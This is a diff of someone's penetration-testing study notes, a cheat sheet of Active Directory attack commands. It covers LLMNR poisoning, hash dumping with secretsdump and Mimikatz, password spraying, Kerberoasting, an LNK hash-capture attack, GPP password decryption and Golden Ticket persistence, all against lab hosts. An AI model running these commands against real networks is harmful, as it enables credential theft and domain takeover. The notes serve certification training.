@@ -460,7 +460,7 @@ Extract the hash from windows. you need to have sam, security, and system files
 
 **before getting the shell**
 LLMNR Poisoning
-.          responder -I eth0 -dwPv
+.          responder -I eth0 -dPv
 .          dir \\<Kali_IP>\test
 .          hashcat -m <module_number> <file.hash> rockyou2021.txt --force
 SMB Relay
@@ -494,9 +494,9 @@ POST-COMPROMISE AD ENUMERATION
 ldapdomaindump     (you can use this instead of ntlmrelayx.py -6)
 .          ldapdomaindump ldaps://10.0.2.16 -u 'raman' -p password
 bloodhound
-.          neo4j console  (credentials neo4j:to0or)
+.          bloodhound-python -d raman.local -u machine1 -p Ab2002.. -ns <DC-IP> -c all   (import the Jason files into bloodhound)
+.          neo4j console  (credentials neo4j:to0or) | ulimit -n 100000  (if the service didn't work. Warning: max 1024 open files..)
 .          bloodhound   (credentials neo4j:to0or)
-.          bloodhound-python -d raman.local -u machine1 -p Ab2002.. -ns <DC - IP> -c all   (import the jason files into bloodhound)
 plumhound
      make sure that neo4j & bloodhound are running
 .          python3 plumhound.py --easy -p to0or
@@ -507,7 +507,8 @@ pingcastle
 
 **Attacking AD**
 scenario: LLMNR -> raman hash -> crack -> sprayed the password -> found new login -> secretsdump -> local admin hashes -> respray the network with local accounts
-.          secretsdump.py raman.local/machine1:to0or@10.10.16.14     (dump the hashes without metasploit)
+.          use netexec if creackmapexec langing
+.          secretsdump.py raman.local/machine1:to0or@10.10.16.14 -use-vss    (dump the hashes without metasploit)
 .          secretsdump.py machine1:@10.10.16.14 -hashes <hash>     (dump the hashes without metasploit)
 .          hashcat -m <ntlm mode ex. 1000> ntlm.txt rockyou.txt     (you only need to put the NTLM portion from NT:NTLM in the ntlm.txt file)
 .          crackmapexec smb <ip/CIDR> -u <user> -d raman.local -p <password>     (pass the password)
@@ -518,12 +519,25 @@ scenario: LLMNR -> raman hash -> crack -> sprayed the password -> found new logi
 .          crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy    (dump lsass. it may have some secret credentials that secretdump didn't reflect)
 .          cmedb     (crackmapexec database)
 Kerberoasting
-.          python GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request     (attacking service accounts. from the enumeration find the service accounts that are in the admin group. you can use ldapdomaindump or bloodhound)
+.          python3 GetUserSPNs.py <domain/username:password> -dc-ip <ip of DC> -request    (Get the password of a service. ldapdomaindump/bloodhound for service enum)
+.          python3 GetNPUsers.py raman.local/<username> -dc-ip <IP of DC>     (Get the password of a user)
 .          hashcat -m 13100 kerberoast.txt rockyou.txt
 Token Impersonation
 .          check token impersonation in the Windows Privilege escalation section
-.          
-.          
+LNK File Attack
+.          netexec smb 10.0.2.19 -d  raman.local -u machine1 -p Ab2002.. -M slinky -o NAME=test SERVER=10.0.2.10     (create & upload a file in smb share so you will get NTLMv2 hash)
+GPP / cPassword
+.          you may find a hashed password in a particular xml file. if you find cpassword='<gpp-hash>' you can crack the password using
+.          gpp-decrypt <gpp-hash>
+Mimikatz
+.          privilege::debug | token::elevate | sekurlsa::logonpasswords
+
+**Persistence**
+Golden Ticket - Mimikatz
+.          Dump the hashes using Sercretsdump.py after accessing DC
+.          You need to have the Administrator hash along with Kerbtgt.
+.          run mimikatz.exe | kerberos::golden /domain:raman.local /sid:S-1-5-21-1314456-456789-12345687 /user:Administrator:NTLM /krbtgt:NTLM /ptt
+.          For SID don't take the last portion; for Administrator&kebtgt hashes take only NTLM hash from NT:NTLM; watch nakera episode 58 FYR
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
